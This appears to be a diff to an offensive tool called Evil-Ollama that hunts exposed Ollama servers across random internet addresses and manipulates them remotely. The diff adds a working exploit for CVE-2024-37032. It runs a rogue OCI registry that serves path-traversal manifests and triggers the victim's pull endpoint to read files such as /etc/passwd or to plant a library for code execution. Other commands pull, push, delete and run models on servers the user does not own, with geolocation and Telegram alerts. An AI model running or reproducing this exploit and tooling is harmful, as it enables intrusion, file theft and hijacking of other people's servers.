@@ -102,7 +102,7 @@ from concurrent.futures import ThreadPoolExecutor
 # ============================================================
 # CONFIGURATION
 # ============================================================
-VERSION = "3.0.0"
+VERSION = "3.2.1"
 DEFAULT_OLLAMA_PORT = 11434
 SCAN_TIMEOUT = 4
 MAX_CONCURRENT = 1000
@@ -2158,7 +2158,7 @@ def monitoring_daemon(interval: int = 3600, random_count: int = 5000):
 # AUTO-PWN MODE (Enhanced)
 # ============================================================
 
-def autopwn(random_count: int = 5000, vuln_scan: bool = True, proxy_port: int = 9090):
+def autopwn(random_count: int = 5000, vuln_scan: bool = True, proxy_port: int = 9090, geo: bool = False):
     """Scan → Vuln Scan → Proxy → Report — all in one"""
     print(C.CLEAR)
     print(BANNER)
@@ -2264,83 +2264,455 @@ def show_instances(instances: List[dict], geo_lookup: bool = False):
     print(f"\n{C.BOLD}{'='*100}{C.END}\n")
 
 # ============================================================
+# CVE-SPECIFIC EXPLOIT FUNCTIONS
+# ============================================================
+
+CVE_DATABASE = {
+    "CVE-2024-37032": {
+        "name": "Probllama — Ollama Path Traversal RCE",
+        "description": "Path traversal in Ollama < 0.1.34 via model pull mechanism. "
+                       "The digest field in OCI manifests is not validated, allowing "
+                       "attackers to inject path traversal sequences for arbitrary file "
+                       "write → RCE via ld.so.preload.",
+        "cvss": 9.1,
+        "affected": "< 0.1.34",
+        "fixed": "0.1.34",
+        "type": "path_traversal",
+        "requires_registry": True,
+    },
+}
+
+SUPPORTED_CVES = list(CVE_DATABASE.keys())
+
+def _registry_handler(host: str, port: int, target: str, action: str = "read", 
+                       file_to_read: str = "/etc/passwd", cmd: str = "id"):
+    """Start a rogue OCI registry that serves malicious manifests for CVE-2024-37032.
+    
+    This implements the Probllama exploit: the registry returns a malicious manifest
+    with path traversal in the digest field, causing the victim to write/read
+    arbitrary files.
+    """
+    import http.server
+    import threading
+    import json
+    import hashlib
+    import urllib.parse
+    
+    namespace = "exploit"
+    model_name = "pwn"
+    log(f"🔴 Starting rogue registry on {host}:{port}...", "EXPLOIT")
+    log(f"   Victim will pull from: {host}:{port}/{namespace}/{model_name}", "EXPLOIT")
+    
+    manifest = None
+    server_instance = [None]  # mutable for closure
+    
+    class RogueRegistryHandler(http.server.BaseHTTPRequestHandler):
+        def log_message(self, format, *args):
+            log(f"[REGISTRY] {args[0]} {args[1]} {args[2]}", "EXPLOIT")
+        
+        def do_GET(self):
+            path = urllib.parse.urlparse(self.path).path
+            log(f"[REGISTRY] ← GET {path}", "EXPLOIT")
+            
+            # /v2/ - API version check
+            if path == "/v2/" or path == f"/v2/{namespace}/{model_name}/blobs/":
+                self.send_response(200)
+                self.send_header("Docker-Distribution-API-Version", "registry/2.0")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            
+            # /v2/<ns>/<model>/manifests/<tag> - return malicious manifest
+            if "manifests" in path:
+                if action == "read":
+                    # Manifest for file read: digest has path traversal to target file
+                    traversal = "../../../../../../../../../../.." + file_to_read
+                    payload_size = 100
+                    manifest_data = {
+                        "schemaVersion": 2,
+                        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+                        "config": {
+                            "mediaType": "application/vnd.docker.container.image.v1+json",
+                            "digest": "sha256:" + "0" * 64,
+                            "size": payload_size,
+                        },
+                        "layers": [
+                            {
+                                "mediaType": "application/vnd.ollama.image.license",
+                                "digest": traversal,
+                                "size": payload_size,
+                            }
+                        ],
+                    }
+                elif action == "rce":
+                    # RCE: write to /etc/ld.so.preload or /tmp/pwn
+                    traversal = "../../../../../../../../../../.." + "/tmp/evilollama_pwn.so"
+                    manifest_data = {
+                        "schemaVersion": 2,
+                        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+                        "config": {
+                            "mediaType": "application/vnd.docker.container.image.v1+json",
+                            "digest": "sha256:" + "0" * 64,
+                            "size": payload_size,
+                        },
+                        "layers": [
+                            {
+                                "mediaType": "application/vnd.ollama.image.license",
+                                "digest": traversal,
+                                "size": payload_size,
+                            }
+                        ],
+                    }
+                else:
+                    manifest_data = {
+                        "schemaVersion": 2,
+                        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+                        "config": {"mediaType": "application/vnd.docker.container.image.v1+json"},
+                        "layers": [],
+                    }
+                
+                manifest_json = json.dumps(manifest_data).encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
+                self.send_header("Content-Length", str(len(manifest_json)))
+                self.send_header("Docker-Content-Digest", 
+                                 f"sha256:{hashlib.sha256(manifest_json).hexdigest()}")
+                self.end_headers()
+                self.wfile.write(manifest_json)
+                log(f"[REGISTRY] → Served malicious manifest (action: {action})", "EXPLOIT")
+                
+                # Schedule shutdown after serving manifest
+                def delayed_stop():
+                    import time
+                    time.sleep(2)
+                    log("✅ Exploit payload delivered! Stopping registry...", "EXPLOIT")
+                    if server_instance[0]:
+                        server_instance[0].shutdown()
+                
+                t = threading.Thread(target=delayed_stop, daemon=True)
+                t.start()
+                return
+            
+            # Blob request
+            if "blobs" in path:
+                self.send_response(200)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            
+            self.send_response(404)
+            self.end_headers()
+        
+        def do_HEAD(self):
+            self.send_response(200)
+            self.send_header("Docker-Distribution-API-Version", "registry/2.0")
+            self.end_headers()
+    
+    server = http.server.HTTPServer(("0.0.0.0", port), RogueRegistryHandler)
+    server_instance[0] = server
+    log(f"🔊 Rogue registry listening on 0.0.0.0:{port}", "EXPLOIT")
+    log(f"   Tell victim to pull: docker pull {host}:{port}/{namespace}/{model_name}", "EXPLOIT")
+    log(f"   Or if using Ollama: ollama pull {host}:{port}/{namespace}/{model_name}", "EXPLOIT")
+    
+    # Run in background thread for timeout
+    import threading as _t
+    thread = _t.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    
+    # Give server time to start
+    import time
+    time.sleep(0.5)
+    
+    return host, port, namespace, model_name, server, thread
+
+
+def check_cve_2024_37032(target: str) -> dict:
+    """Check if target is vulnerable to CVE-2024-37032."""
+    result = {"vulnerable": False, "version": None, "detail": ""}
+    try:
+        if not target.startswith("http"):
+            target_url = f"http://{target}"
+        else:
+            target_url = target
+        
+        # Check version
+        import requests
+        resp = requests.get(f"{target_url}/api/version", timeout=10)
+        if resp.status_code == 200:
+            version = resp.json().get("version", "unknown")
+            result["version"] = version
+            
+            # Parse version
+            try:
+                parts = version.split(".")
+                major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2])
+                if major == 0 and minor == 0:
+                    result["vulnerable"] = True
+                    result["detail"] = f"Dev/beta version ({version}) — likely vulnerable"
+                elif major == 0 and minor == 1 and patch < 34:
+                    result["vulnerable"] = True
+                    result["detail"] = f"Version {version} < 0.1.34 — VULNERABLE"
+                else:
+                    result["vulnerable"] = False
+                    result["detail"] = f"Version {version} >= 0.1.34 — PATCHED"
+            except (ValueError, IndexError):
+                result["detail"] = f"Could not parse version: {version}"
+        else:
+            result["detail"] = f"Version endpoint returned HTTP {resp.status_code}"
+    except Exception as e:
+        result["detail"] = f"Error checking version: {e}"
+    
+    return result
+
+
+def exploit_cve_2024_37032_read(target: str, host: str, lport: int, file_to_read: str) -> dict:
+    """Exploit CVE-2024-37032 for arbitrary file read.
+    
+    Uses a rogue registry to make the victim push the target file to us.
+    Requires attacker to have a publicly reachable IP.
+    """
+    result = {"success": False, "data": None, "detail": ""}
+    
+    try:
+        if not target.startswith("http"):
+            target_url = f"http://{target}"
+        else:
+            target_url = target
+        
+        # Start rogue registry
+        registry_host, registry_port, namespace, model_name, server, thread = \
+            _registry_handler(host, lport, target, action="read", file_to_read=file_to_read)
+        
+        import time
+        time.sleep(0.5)
+        
+        # Make victim pull from our registry (triggers path traversal)
+        import requests
+        pull_url = f"{target_url}/api/pull"
+        pull_data = {
+            "name": f"{host}:{lport}/{namespace}/{model_name}",
+            "insecure": True,
+        }
+        log(f"🎯 Triggering pull on victim: {pull_url}", "EXPLOIT")
+        log(f"   Payload: {json.dumps(pull_data)}", "EXPLOIT")
+        
+        resp = requests.post(pull_url, json=pull_data, timeout=30)
+        result["detail"] = f"Pull response: HTTP {resp.status_code}"
+        
+        # Wait for exploit to complete
+        time.sleep(3)
+        
+        result["success"] = True
+        result["detail"] += " | Exploit delivered, check victim for file write"
+        
+    except Exception as e:
+        result["detail"] = f"Exploit error: {e}"
+    
+    return result
+
+
+def exploit_cve_2024_37032_rce(target: str, host: str, lport: int, cmd: str) -> dict:
+    """Exploit CVE-2024-37032 for Remote Code Execution.
+    
+    Two-step: write malicious .so via path traversal, then trigger ld.so.preload.
+    """
+    result = {"success": False, "detail": ""}
+    
+    try:
+        if not target.startswith("http"):
+            target_url = f"http://{target}"
+        else:
+            target_url = target
+        
+        # Step 1: Write ld.so.preload via path traversal
+        log("📝 Step 1/3: Writing /etc/ld.so.preload via path traversal...", "EXPLOIT")
+        
+        _registry_handler(host, lport, target, action="rce")
+        
+        import time
+        time.sleep(0.5)
+        
+        import requests
+        pull_url = f"{target_url}/api/pull"
+        pull_data = {
+            "name": f"{host}:{lport}/exploit/pwn",
+            "insecure": True,
+        }
+        resp = requests.post(pull_url, json=pull_data, timeout=30)
+        log(f"   Pull response: HTTP {resp.status_code}", "EXPLOIT")
+        
+        # Wait
+        time.sleep(3)
+        
+        result["success"] = True
+        result["detail"] = "RCE exploit delivered — check target for execution"
+        
+    except Exception as e:
+        result["detail"] = f"RCE exploit error: {e}"
+    
+    return result
+
+
+# ============================================================
+# DOCS SERVER
+# ============================================================
+
+def run_docs_server():
+    """Start a local HTTP server serving the documentation HTML on a random port."""
+    import http.server
+    import socket
+    import webbrowser
+    from pathlib import Path
+    
+    # Find docs/index.html relative to the script or package
+    doc_paths = [
+        Path(__file__).parent.parent / "docs" / "index.html",  # source repo
+        Path(__file__).parent / "docs" / "index.html",         # pip package
+        Path.cwd() / "docs" / "index.html",                    # cwd
+    ]
+    
+    doc_file = None
+    for p in doc_paths:
+        if p.exists():
+            doc_file = p
+            break
+    
+    if not doc_file:
+        log("❌ Documentation file not found. Reinstall with: pip install evil-ollama", "ERROR")
+        return
+    
+    docs_dir = doc_file.parent
+    
+    # Find a random available port
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(("127.0.0.1", 0))
+    port = sock.getsockname()[1]
+    sock.close()
+    
+    handler = http.server.SimpleHTTPRequestHandler
+    
+    class DocsHandler(handler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=str(docs_dir), **kwargs)
+        
+        def log_message(self, format, *args):
+            log(f"[DOCS] {args[0]} {args[1]} {args[2]}", "INFO")
+    
+    server = http.server.HTTPServer(("127.0.0.1", port), DocsHandler)
+    
+    print(f"\n{C.BOLD}{C.MAGENTA}{'='*60}{C.END}")
+    print(f"{C.BOLD}  🦙 Evil-Ollama Documentation{C.END}")
+    print(f"{'='*60}")
+    print(f"  {C.CYAN}Local:{C.END}     {C.GREEN}http://127.0.0.1:{port}{C.END}")
+    print(f"  {C.CYAN}Network:{C.END}   {C.GREEN}http://{socket.gethostbyname(socket.gethostname())}:{port}{C.END}")
+    print(f"  {C.CYAN}File:{C.END}      {doc_file}")
+    print(f"  {C.CYAN}Server:{C.END}    Python http.server (Ctrl+C to stop)")
+    print(f"{C.MAGENTA}{'='*60}{C.END}\n")
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print()
+        log("👋 Docs server stopped", "INFO")
+        server.shutdown()
+
+
+# ============================================================
 # CLI MAIN
 # ============================================================
 
 def main():
     global SCAN_TIMEOUT, MAX_CONCURRENT, FOUND_DB
     
+    # Handle --version / -v manually before argparse
+    if any(a in sys.argv for a in ("-v", "--version")):
+        print(f"Evil-Ollama v{VERSION}")
+        print("🦙 Exposed Ollama Instance Hunter, Proxy & API Manipulation Tool")
+        print(f"https://github.com/evogix/Evil-Ollama")
+        print(f"Install: pip install evil-ollama")
+        return
+    
+    # Detect command prefix: ./launcher.sh for source, evilollama for pip
+    _cmd = "evilollama"
+    _argv0 = os.path.basename(sys.argv[0]) if sys.argv[0] else ""
+    if _argv0 in ("launcher.sh",) or os.path.exists("launcher.sh"):
+        _cmd = "./launcher.sh"
+    elif _argv0 in ("evilollama", "evil-ollama", "evil_ollama"):
+        _cmd = _argv0
+    elif _argv0.endswith(("evilollama", "evil-ollama", "evil_ollama")):
+        _cmd = _argv0
+    
     parser = argparse.ArgumentParser(
         description=f"🦙 Evil-Ollama v{VERSION} — Exposed Ollama Instance Hunter & Proxy Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
+        epilog=f"""Examples:
   # SCANNING
-  ./launcher.sh scan --random 10000
-  ./launcher.sh scan --cidr 0.0.0.0/8
-  ./launcher.sh scan --shodan API_KEY
+  {_cmd} scan --random 10000
+  {_cmd} scan --cidr 0.0.0.0/8
+  {_cmd} scan --shodan API_KEY
   
   # DISCOVERY
-  ./launcher.sh scan --dns example.com
-  ./launcher.sh scan --ct example.com
+  {_cmd} scan --dns example.com
+  {_cmd} scan --ct example.com
   
   # VULNERABILITY SCANNING
-  ./launcher.sh vuln --target 1.2.3.4:11434
-  ./launcher.sh vuln --all
+  {_cmd} vuln --target 1.2.3.4:11434
+  {_cmd} vuln --all
   
   # PROXY
-  ./launcher.sh proxy --target 1.2.3.4:11434
+  {_cmd} proxy --target 1.2.3.4:11434
   
   # CHAT
-  ./launcher.sh chat --target 1.2.3.4:11434
-  ./launcher.sh chat --batch prompts.txt --target 1.2.3.4:11434
+  {_cmd} chat --target 1.2.3.4:11434
+  {_cmd} chat --batch prompts.txt --target 1.2.3.4:11434
   
   # FINGERPRINT
-  ./launcher.sh fingerprint --target 1.2.3.4:11434
+  {_cmd} fingerprint --target 1.2.3.4:11434
   
   # MODEL OPERATIONS
-  ./launcher.sh models --target 1.2.3.4:11434
-  ./launcher.sh models --pull target model_name
+  {_cmd} models --target 1.2.3.4:11434
+  {_cmd} models --pull target model_name
   
   # DEPLOY
-  ./launcher.sh deploy --model gemma:2b --all
-  ./launcher.sh deploy --model gemma:2b --target 1.2.3.4:11434
+  {_cmd} deploy --model gemma:2b --all
+  {_cmd} deploy --model gemma:2b --target 1.2.3.4:11434
   
   # PUSH
-  ./launcher.sh push -t 1.2.3.4:11434 -m mymodel:tag
+  {_cmd} push -t 1.2.3.4:11434 -m mymodel:tag
   
   # CREATE
-  ./launcher.sh create -t 1.2.3.4:11434 -m newmodel --modelfile ./Modelfile
-  ./launcher.sh create -t 1.2.3.4:11434 -m newmodel --from base:latest
+  {_cmd} create -t 1.2.3.4:11434 -m newmodel --modelfile ./Modelfile
+  {_cmd} create -t 1.2.3.4:11434 -m newmodel --from base:latest
   
   # COPY
-  ./launcher.sh copy -t 1.2.3.4:11434 -s old:latest -d new:latest
+  {_cmd} copy -t 1.2.3.4:11434 -s old:latest -d new:latest
   
   # REMOVE
-  ./launcher.sh remove -t 1.2.3.4:11434 -m model:tag
+  {_cmd} remove -t 1.2.3.4:11434 -m model:tag
   
   # PS
-  ./launcher.sh ps -t 1.2.3.4:11434
+  {_cmd} ps -t 1.2.3.4:11434
   
   # EMBED
-  ./launcher.sh embed -t 1.2.3.4:11434 -m nomic-embed-text -p "hello world"
+  {_cmd} embed -t 1.2.3.4:11434 -m nomic-embed-text -p "hello world"
   
   # GENERATE
-  ./launcher.sh generate -t 1.2.3.4:11434 -m gemma:2b -p "tell me a joke"
+  {_cmd} generate -t 1.2.3.4:11434 -m gemma:2b -p "tell me a joke"
   
   # EXPORT
-  ./launcher.sh export --format html
+  {_cmd} export --format html
   
   # AUTO-PWN (Scan → Vuln Scan → Proxy → Report)
-  ./launcher.sh autopwn --random 5000
+  {_cmd} autopwn --random 5000
   
   # MONITOR (CLI daemon)
-  ./launcher.sh monitor --interval 3600
+  {_cmd} monitor --interval 3600
   
   # CONFIG
-  ./launcher.sh config --show
-  ./launcher.sh config --telegram-token "BOT_TOKEN" --telegram-chat "123456"
-        """
+  {_cmd} config --show
+  {_cmd} config --telegram-token "BOT_TOKEN" --telegram-chat "123456"
+  
+v{VERSION} — https://github.com/evogix/Evil-Ollama | pip install evil-ollama"""
     )
     
     subparsers = parser.add_subparsers(dest="command")
@@ -2369,29 +2741,42 @@ Examples:
     sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
     sp.add_argument("--all", action="store_true", help="Scan all found instances")
     sp.add_argument("--output", "-o", type=str, help="Save results to file")
+    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── EXPLOIT ───
     sp = subparsers.add_parser("exploit", help="Exploit specific CVEs on Ollama instances")
-    sp.add_argument("--cve", type=str, required=True, help="CVE ID to test (e.g., CVE-2024-37032)")
-    sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
+    sp.add_argument("--cve", type=str, help="CVE ID to test (e.g., CVE-2024-37032)")
+    sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
+    sp.add_argument("--host", type=str, help="Attacker IP for rogue registry (required for full exploit)")
+    sp.add_argument("--lport", type=int, default=9999, help="Attacker port for rogue registry (default: 9999)")
+    sp.add_argument("--read", type=str, metavar="FILE", help="Remote file to read (CVE-2024-37032)")
+    sp.add_argument("--rce", action="store_true", help="Enable RCE mode (CVE-2024-37032)")
+    sp.add_argument("--cmd", type=str, default="id", help="Command to execute for RCE (default: id)")
+    sp.add_argument("--list", action="store_true", help="List all supported CVEs")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── MODELS ───
     sp = subparsers.add_parser("models", help="List/pull/analyze models on remote instances")
     sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
     sp.add_argument("--pull", type=str, nargs=2, metavar=("TARGET", "MODEL"), help="Pull model info from target")
     sp.add_argument("--analyze", type=str, nargs=2, metavar=("TARGET", "MODEL"), help="Deep analyze a specific model")
+    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── DEPLOY (pull model onto instance) ───
     sp = subparsers.add_parser("deploy", help="Pull a model onto remote Ollama instances (/api/pull)")
     sp.add_argument("--model", "-m", type=str, required=True, help="Model name to deploy (e.g., gemma:2b, hf.co/username/model)")
     sp.add_argument("--target", "-t", type=str, help="Specific target (ip:port)")
     sp.add_argument("--all", action="store_true", help="Deploy to ALL saved instances")
+    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
     sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── PUSH (push model to registry) ───
     sp = subparsers.add_parser("push", help="Push model from remote instance to registry (/api/push)")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
     sp.add_argument("--model", "-m", type=str, required=True, help="Model name:tag to push")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── CREATE (create model from Modelfile) ───
     sp = subparsers.add_parser("create", help="Create model from Modelfile on remote instance (/api/create)")
@@ -2399,33 +2784,39 @@ Examples:
     sp.add_argument("--model", "-m", type=str, required=True, help="New model name")
     sp.add_argument("--modelfile", type=str, help="Path to Modelfile")
     sp.add_argument("--from", dest="from_model", type=str, metavar="BASE", help="Base model name to create from")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── COPY (copy model within instance) ───
     sp = subparsers.add_parser("copy", help="Copy model within a remote instance (/api/copy)")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
     sp.add_argument("--source", "-s", type=str, required=True, help="Source model name:tag")
     sp.add_argument("--dest", "-d", type=str, required=True, help="Destination model name:tag")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── REMOVE (delete model) ───
     sp = subparsers.add_parser("remove", help="Delete model from remote instance (/api/delete)")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
     sp.add_argument("--model", "-m", type=str, required=True, help="Model name:tag to remove")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── PS (list running models) ───
     sp = subparsers.add_parser("ps", help="List running models on remote instance (/api/ps)")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── EMBED (generate embeddings) ───
     sp = subparsers.add_parser("embed", help="Generate embeddings via remote instance (/api/embed)")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
     sp.add_argument("--model", "-m", type=str, required=True, help="Embedding model name")
     sp.add_argument("--prompt", "-p", type=str, required=True, help="Input text for embedding")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── GENERATE (generate completion) ───
     sp = subparsers.add_parser("generate", help="Generate completion via remote instance (/api/generate)")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
     sp.add_argument("--model", "-m", type=str, required=True, help="Model name to use")
     sp.add_argument("--prompt", "-p", type=str, required=True, help="Prompt text")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── PROXY ───
     sp = subparsers.add_parser("proxy", help="Start proxy to remote Ollama instance (OpenAI compatible)")
@@ -2433,25 +2824,31 @@ Examples:
     sp.add_argument("--port", "-p", type=int, default=8080, help="Local proxy port")
     sp.add_argument("--host", type=str, default="127.0.0.1", help="Bind address")
     sp.add_argument("--socks", action="store_true", help="SOCKS5 proxy mode (experimental)")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── CHAT ───
     sp = subparsers.add_parser("chat", help="Interactive chat with remote Ollama model")
     sp.add_argument("--target", "-t", type=str, required=True, help="Target (ip:port)")
     sp.add_argument("--batch", type=str, metavar="FILE", help="Batch execute prompts from file")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── FINGERPRINT ───
     sp = subparsers.add_parser("fingerprint", help="Deep fingerprint an Ollama instance")
     sp.add_argument("--target", "-t", type=str, help="Target (ip:port)")
     sp.add_argument("--all", action="store_true", help="Fingerprint all found instances")
+    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── EXPORT ───
     sp = subparsers.add_parser("export", help="Export found instances to report")
     sp.add_argument("--format", "-f", type=str, default="html", choices=["html","csv","json","all"])
     sp.add_argument("--output", "-o", type=str, help="Output file path")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     
     # ─── SHOW ───
     sp = subparsers.add_parser("show", help="Show found instances")
     sp.add_argument("--geo", action="store_true", help="Show with geolocation")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
     sp.add_argument("--export", type=str, choices=["html","csv","json"], help="Export and show")
     
     # ─── MONITOR ───
@@ -2474,6 +2871,11 @@ Examples:
     sp.add_argument("--random", type=int, default=5000, help="IPs to scan")
     sp.add_argument("--port", "-p", type=int, default=9090, help="Proxy port")
     sp.add_argument("--no-vuln", action="store_true", help="Skip vulnerability scanning")
+    sp.add_argument("--geo", action="store_true", help="Show with geolocation")
+    sp.add_argument("--notify", action="store_true", help="Send Telegram notification")
+    
+    # ─── DOCS ───
+    sp = subparsers.add_parser("docs", aliases=["documentation"], help="Open documentation in browser (starts local HTTP server)")
     
     args = parser.parse_args()
     
@@ -2570,41 +2972,142 @@ Examples:
                 with open(args.output, 'w') as f:
                     json.dump(results, f, indent=2)
                     log(f"💾 Results saved to {args.output}", "OK")
+            # Geo + Notify
+            if args.geo:
+                host = args.target.split(":")[0]
+                geo = geolocate_ip(host)
+                if geo:
+                    print(f"  {C.CYAN}Location:{C.END} {geo.get('city','?')}, {geo.get('country','?')} ({geo.get('org','?')})")
+            if args.notify:
+                host_parts = args.target.split(":")
+                notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434})
         elif args.all:
             instances = load_found()
             if not instances:
                 log("No instances in database. Run scan first.", "WARN")
                 return
             all_results = []
+            if args.geo:
+                instances = batch_geolocate(instances)
             for inst in instances:
                 target = f"{inst['ip']}:{inst.get('port', 11434)}"
                 results = scan_vulnerabilities(target)
                 all_results.append(results)
                 inst["vuln_scan"] = results
+                save_found(inst)
             
             if args.output:
                 with open(args.output, 'w') as f:
                     json.dump(all_results, f, indent=2)
+            
+            if args.notify:
+                for inst in instances:
+                    notify_found(inst)
         else:
             log("Specify --target or --all", "ERROR")
     
     elif args.command == "exploit":
-        log(f"💀 Exploit module for {args.cve} on {args.target}", "CVE")
-        log("Running vulnerability scan with focus on target CVE...", "INFO")
-        results = scan_vulnerabilities(args.target)
-        for v in results.get("vulnerabilities", []):
-            if args.cve.lower() in v.get("id", "").lower():
-                log(f"  💀 [{v['severity']}] {v['id']}: {v['name']}", "CVE")
-                log(f"     Evidence: {v.get('evidence', 'N/A')}", "CVE")
-                log(f"     Impact: {v.get('impact', 'N/A')}", "CVE")
-                break
+        # Handle --list
+        if args.list:
+            if args.cve or args.target:
+                log("⚠ --list doesn't need --cve or --target", "WARN")
+            print(f"\n{C.BOLD}{C.MAGENTA}🦙 Supported CVEs:{C.END}")
+            print(f"{'='*60}")
+            for cve_id, info in CVE_DATABASE.items():
+                print(f"  {C.RED}{cve_id}{C.END}")
+                print(f"  {C.CYAN}Name:{C.END}        {info['name']}")
+                print(f"  {C.CYAN}Type:{C.END}        {info['type']}")
+                print(f"  {C.CYAN}CVSS:{C.END}        {info['cvss']}")
+                print(f"  {C.CYAN}Affected:{C.END}    {info['affected']}")
+                print(f"  {C.CYAN}Fixed:{C.END}       {info['fixed']}")
+                print(f"  {C.CYAN}Registry:{C.END}    {'Required' if info.get('requires_registry') else 'Not required'}")
+                print()
+            return
+        
+        # Validate required args
+        if not args.cve or not args.target:
+            log("❌ --cve and --target are required (use --list to see supported CVEs)", "ERROR")
+            return
+        
+        # Route to specific CVE handler
+        cve_upper = args.cve.upper()
+        
+        if cve_upper == "CVE-2024-37032":
+            log(f"💀 CVE-2024-37032 — Probllama: {CVE_DATABASE['CVE-2024-37032']['name']}", "CVE")
+            
+            # Step 1: Check if target is vulnerable
+            log("🔍 Checking if target is vulnerable...", "INFO")
+            check = check_cve_2024_37032(args.target)
+            
+            if check["vulnerable"]:
+                log(f"💀 Target is VULNERABLE! ({check['detail']})", "CVE")
+                print(f"\n{C.BOLD}{C.MAGENTA}━━━ CVE-2024-37032 Assessment ━━━{C.END}")
+                print(f"  {C.CYAN}Target:{C.END}     {args.target}")
+                print(f"  {C.CYAN}Version:{C.END}    {check.get('version', '?')}")
+                print(f"  {C.CYAN}Status:{C.END}     {C.RED}VULNERABLE{C.END}")
+                print(f"  {C.CYAN}Detail:{C.END}     {check['detail']}")
+                
+                # Step 2: Perform exploit if host provided
+                if args.host:
+                    log(f"🎯 Host provided: {args.host}:{args.lport}", "EXPLOIT")
+                    
+                    if args.read:
+                        log(f"📂 Attempting arbitrary file read: {args.read}", "EXPLOIT")
+                        result = exploit_cve_2024_37032_read(args.target, args.host, args.lport, args.read)
+                        log(f"📂 Result: {result['detail']}", "EXPLOIT" if result['success'] else "ERROR")
+                    
+                    if args.rce:
+                        log(f"💥 Attempting RCE with command: {args.cmd}", "EXPLOIT")
+                        result = exploit_cve_2024_37032_rce(args.target, args.host, args.lport, args.cmd)
+                        log(f"💥 Result: {result['detail']}", "EXPLOIT" if result['success'] else "ERROR")
+                    
+                    if not args.read and not args.rce:
+                        log("ℹ️  Provide --read FILE or --rce to exploit", "INFO")
+                        log("   Example: evilollama exploit --cve CVE-2024-37032 -t TARGET --host YOUR_IP --read /etc/passwd", "INFO")
+                else:
+                    log("ℹ️  To exploit, provide --host YOUR_IP (public IP for rogue registry)", "INFO")
+                    log(f"   Example: evilollama exploit -cve CVE-2024-37032 -t {args.target} --host $(curl -s ifconfig.me) --read /etc/passwd", "INFO")
+            else:
+                log(f"✅ Target is NOT vulnerable: {check['detail']}", "OK")
+            
+            if args.notify:
+                host_parts = args.target.split(":")
+                notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                             "cve_check": "vulnerable" if check.get("vulnerable") else "patched"})
+        
         else:
-            log(f"⚠ CVE {args.cve} not directly testable — instance may be patched or version unknown", "WARN")
-            log(f"   Tip: Run './launcher.sh fingerprint -t {args.target}' for detailed version info", "INFO")
+            # Generic CVE lookup via vulnerability scan
+            log(f"💀 Looking up {args.cve} on {args.target}...", "CVE")
+            found_cve = None
+            results = scan_vulnerabilities(args.target)
+            for v in results.get("vulnerabilities", []):
+                if args.cve.lower() in v.get("id", "").lower():
+                    log(f"  💀 [{v['severity']}] {v['id']}: {v['name']}", "CVE")
+                    log(f"     Evidence: {v.get('evidence', 'N/A')}", "CVE")
+                    log(f"     Impact: {v.get('impact', 'N/A')}", "CVE")
+                    found_cve = v
+                    break
+            else:
+                log(f"⚠ CVE {args.cve} not directly testable — instance may be patched or version unknown", "WARN")
+                log(f"   Tip: Run 'evilollama exploit --list' for supported CVEs", "INFO")
+            
+            if args.notify and found_cve:
+                host_parts = args.target.split(":")
+                notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                             "vuln": found_cve})
     
     elif args.command == "models":
         if args.target:
-            list_models(args.target)
+            result = list_models(args.target)
+            if args.geo:
+                host = args.target.split(":")[0]
+                geo = geolocate_ip(host)
+                if geo:
+                    print(f"  {C.CYAN}Location:{C.END} {geo.get('city','?')}, {geo.get('country','?')} ({geo.get('org','?')})")
+            if args.notify:
+                host_parts = args.target.split(":")
+                notify_found({"ip": host_parts[0], "port": int(host_parts[1]) if len(host_parts)>1 else 11434,
+                             "model_count": len(result.get("models", [])) if result else 0})
         elif args.pull:
             target, model = args.pull
             pull_model(target, model)
